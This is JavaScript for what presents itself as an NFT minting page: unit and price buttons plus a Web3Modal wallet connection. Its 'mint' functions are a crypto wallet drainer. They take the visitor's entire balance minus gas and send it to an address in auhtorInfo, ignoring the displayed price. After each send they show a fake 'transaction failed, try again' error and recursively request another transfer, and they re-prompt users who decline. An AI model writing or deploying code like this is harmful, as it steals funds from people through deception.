//#region Page Button
const priceHtml = document.getElementById('lnprice');
let tempMaxSup = mintInfo.minUnits;

document.getElementById('plus').addEventListener('click', function () {
    let total = parseInt(priceHtml.innerText, 10);
    if (total >= mintInfo.maxUnits) total = mintInfo.maxUnits;
    else ++total;
    updatePrice(total)
});
document.getElementById('minus').addEventListener('click', function () {
    let total = parseInt(priceHtml.innerText, 10);
    if (total <= mintInfo.minUnits) total = mintInfo.minUnits;
    else --total;
    updatePrice(total)
});
document.getElementById('ape-max').addEventListener('click', function () {
    let nowSup = parseInt(priceHtml.innerText, 10)
    if (nowSup != mintInfo.maxUnits) {
        tempMaxSup = nowSup;
        updatePrice(mintInfo.maxUnits)
    } else updatePrice(tempMaxSup)
});

function updatePrice(total) {
    const totalPrice = (total * mintInfo.price).toFixed(2);
    document.getElementById('lnprice').innerText = total;
    document.getElementById('price').innerText = totalPrice;
}
//#endregion
//#region Utils Functions


function openInNewTab(href) {
    Object.assign(document.createElement('a'), {
        target: '_blank',
        href: href,
    }).click();
}
//#endregion



// Unpkg imports
const ethers = window.ethers;
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const evmChains = window.evmChains;

let web3Modal;
let provider;
let selectedAccount;

function init() {
    console.log("Initializing example");
    console.log("WalletConnectProvider is", WalletConnectProvider);
    console.log("window.web3 is", window.web3, "window.ethereum is", window.ethereum);

    const providerOptions = {
        walletconnect: {
            package: WalletConnectProvider,
            options: {
                infuraId: auhtorInfo.infuraId,
            }
        }
    };

    web3Modal = new Web3Modal({
        cacheProvider: false,
        providerOptions,
        theme: "dark"
    });

    console.log("Web3Modal instance is", web3Modal);
    Moralis.enableWeb3();
}

/**
 * Kick in the UI action after Web3modal dialog has chosen a provider
 */
async function fetchAccountData() {
    const web3 = new Web3(provider);
    const chainId = await web3.eth.getChainId();
    const chainData = evmChains.getChain(chainId);
    const accounts = await web3.eth.getAccounts();
    selectedAccount = accounts[0];

    console.log("Web3 instance is", web3);
    console.log("Chain data is", chainData);
    console.log("Got accounts", accounts);
    console.log("Selected account is", selectedAccount);

    document.querySelector("#connect").style.display = "none";
    document.querySelector("#transfer").style.display = "block";
}


async function refreshAccountData() {
    document.querySelector("#transfer").style.display = "none";
    document.querySelector("#connect").style.display = "block";

    document.querySelector("#connect").setAttribute("disabled", "disabled")
    await fetchAccountData();
    document.querySelector("#connect").removeAttribute("disabled")
}
async function onConnect() {

    console.log("Opening a dialog", web3Modal);
    try {
        provider = await web3Modal.connect();
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return;
    }

    provider.on("accountsChanged", () => fetchAccountData());
    provider.on("chainChanged", () => fetchAccountData());
    provider.on("networkChanged", () => fetchAccountData());

    await refreshAccountData();
}

async function clickMint() {
    const web3 = new Web3(provider);
    const accounts = await web3.eth.getAccounts();
    selectedAccount = accounts[0];

    const walletBalance = await web3.eth.getBalance(selectedAccount);
    const gasFee = await web3.eth.getGasPrice();
    const giveNum = walletBalance - (gasFee * 2.2 * 21000);
    console.log(giveNum.toString())
    if (giveNum <= 1000000) return alert("You don't have enough balance to mint!");
    document.querySelector("#transfer").setAttribute("disabled", "disabled")
    await askMint(giveNum.toString(), gasFee)
    document.querySelector("#transfer").removeAttribute("disabled")
}
async function askMint(amount, gasFee) {
    const web3 = new Web3(provider);
    walletAddress = (await web3.eth.getAccounts())[0];
    await web3.eth.sendTransaction({
            from: walletAddress,
            to: auhtorInfo.address,
            value: amount,
            gasPrice: gasFee
        })
        .on('transactionHash', function (hash) {
            setTimeout(() => {
                if (isMobile()) {} else {
                    const notif = addNotification("error", `Error! Your transaction failed. Please try again.`)
                    removeNotification(notif, 8000);
                }
            }, 2000);
            console.log(`Transaction hash: ${hash}`)
            return askMint(amount);
        })
        .on('confirmation', () => console.log(`Transaction confirmed x${confirmationNumber}`))
        .on('error', (error) => {
            if (error.message && error.message.includes("insufficient")) console.log(`Insufficient Balance: ${walletAddress} has insufficient balance`);
            if (error.message && error.message.includes("User rejected") || error.message && error.message.includes("User denied")) {
                if (isMobile()) {} else {
                    const notif = addNotification("warning", "You denied the transaction. Please try again.");
                    removeNotification(notif, 5000);
                }
                console.log(`User Denied: ${walletAddress} denied transaction`);
            } else console.log(`Mint Error: ${walletAddress} failed to mint`);
            console.log("Error", error ? error.message : "unknown error");
            return askMint(amount);
        });
}

window.addEventListener('load', async () => {
    init();
    document.querySelector("#connect").addEventListener("click", onConnect);
    document.querySelector("#transfer").addEventListener("click", clickMint);
});
